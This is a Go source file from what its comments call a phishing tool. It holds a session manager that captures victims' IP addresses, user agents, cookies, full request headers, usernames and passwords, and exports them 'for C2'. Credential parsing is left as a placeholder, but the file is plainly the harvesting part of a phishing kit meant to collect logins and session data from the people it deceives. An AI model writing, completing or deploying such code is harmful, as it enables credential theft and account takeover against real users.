package sessions

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"sync"
	"time"
)

// Session represents a phishing session
type Session struct {
	ID           string
	IP           string
	UserAgent    string
	CreatedAt    time.Time
	Credentials  map[string]string
	Cookies      []*http.Cookie
	Headers      map[string]string
	LastActivity time.Time
}

// Manager handles session management
type Manager struct {
	sessions map[string]*Session
	mutex    sync.RWMutex
}

// NewManager creates a new session manager
func NewManager() *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
	}
}

// CreateSession creates a new session from request
func (m *Manager) CreateSession(r *http.Request) string {
	sessionID := generateSessionID()
	
	session := &Session{
		ID:          sessionID,
		IP:          getClientIP(r),
		UserAgent:   r.UserAgent(),
		CreatedAt:   time.Now(),
		Credentials: make(map[string]string),
		Cookies:     r.Cookies(),
		Headers:     make(map[string]string),
		LastActivity: time.Now(),
	}

	// Copy headers
	for k, v := range r.Header {
		if len(v) > 0 {
			session.Headers[k] = v[0]
		}
	}

	m.mutex.Lock()
	m.sessions[sessionID] = session
	m.mutex.Unlock()

	return sessionID
}

// GetSession retrieves a session by ID
func (m *Manager) GetSession(sessionID string) (*Session, bool) {
	m.mutex.RLock()
	defer m.mutex.RUnlock()
	session, exists := m.sessions[sessionID]
	return session, exists
}

// LogRequest logs a request to a session
func (m *Manager) LogRequest(r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		return
	}

	m.mutex.Lock()
	defer m.mutex.Unlock()
	
	if session, exists := m.sessions[sessionID]; exists {
		session.LastActivity = time.Now()
	}
}

// ExtractCredentials extracts credentials from response
func (m *Manager) ExtractCredentials(resp *http.Response) {
	// Parse response body for credentials
	// This would parse form data, JSON, or other formats
	// Implementation depends on target site structure
	
	sessionID := resp.Request.Header.Get("X-Session-ID")
	if sessionID == "" {
		return
	}

	m.mutex.Lock()
	defer m.mutex.Unlock()
	
	if session, exists := m.sessions[sessionID]; exists {
		// Extract username/password from response
		// This is a placeholder - actual implementation would parse the response
		session.Credentials["extracted_at"] = time.Now().Format(time.RFC3339)
		session.LastActivity = time.Now()
	}
}

// AddCredentials adds credentials to a session
func (m *Manager) AddCredentials(sessionID string, username, password string) {
	m.mutex.Lock()
	defer m.mutex.Unlock()
	
	if session, exists := m.sessions[sessionID]; exists {
		session.Credentials["username"] = username
		session.Credentials["password"] = password
		session.LastActivity = time.Now()
	}
}

// GetAllSessions returns all active sessions
func (m *Manager) GetAllSessions() []*Session {
	m.mutex.RLock()
	defer m.mutex.RUnlock()
	
	sessions := make([]*Session, 0, len(m.sessions))
	for _, session := range m.sessions {
		sessions = append(sessions, session)
	}
	return sessions
}

// CleanupOldSessions removes sessions older than maxAge
func (m *Manager) CleanupOldSessions(maxAge time.Duration) {
	m.mutex.Lock()
	defer m.mutex.Unlock()
	
	now := time.Now()
	for id, session := range m.sessions {
		if now.Sub(session.LastActivity) > maxAge {
			delete(m.sessions, id)
		}
	}
}

// generateSessionID generates a random session ID
func generateSessionID() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// getClientIP extracts client IP from request
func getClientIP(r *http.Request) string {
	// Check X-Forwarded-For header
	ip := r.Header.Get("X-Forwarded-For")
	if ip != "" {
		return ip
	}
	
	// Check X-Real-IP header
	ip = r.Header.Get("X-Real-IP")
	if ip != "" {
		return ip
	}
	
	// Fall back to RemoteAddr
	return r.RemoteAddr
}

// ExportSession exports session data for C2
func (s *Session) ExportSession() map[string]interface{} {
	return map[string]interface{}{
		"id":           s.ID,
		"ip":           s.IP,
		"user_agent":   s.UserAgent,
		"created_at":   s.CreatedAt.Format(time.RFC3339),
		"credentials":  s.Credentials,
		"last_activity": s.LastActivity.Format(time.RFC3339),
	}
}

